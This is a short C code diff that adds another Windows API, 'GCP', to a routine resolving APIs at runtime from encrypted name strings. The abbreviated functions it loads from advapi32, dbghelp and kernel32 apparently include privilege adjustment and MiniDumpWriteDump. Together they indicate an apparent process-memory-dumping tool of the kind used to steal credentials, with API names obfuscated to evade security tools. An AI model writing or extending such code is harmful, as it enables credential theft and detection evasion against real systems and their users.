@@ -20,6 +20,7 @@ DECL_API_PTR(ATP);
 DECL_API_PTR(LPVA);
 DECL_API_PTR(MDWD);
 DECL_API_PTR(GPID);
+DECL_API_PTR(GCP);
 
 // internal function to resolve APIs
 static BOOL ResolveApiFromDll(HMODULE hMod, const unsigned char* enc, size_t len, void** fn) {
@@ -57,7 +58,8 @@ BOOL ResolveAllApis(void) {
         ResolveApiFromDll(hAdvapi32, ATP_ENC, sizeof(ATP_ENC), (void**)&pATP) &&
         ResolveApiFromDll(hAdvapi32, LPVA_ENC, sizeof(LPVA_ENC), (void**)&pLPVA) &&
         ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), (void**)&pMDWD) &&
-        ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC), (void**)&pGPID);
+        ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC), (void**)&pGPID) &&
+        ResolveApiFromDll(hKernel32, GCP_ENC, sizeof(GCP_ENC), (void**)&pGCP);
 
     return success;
 }
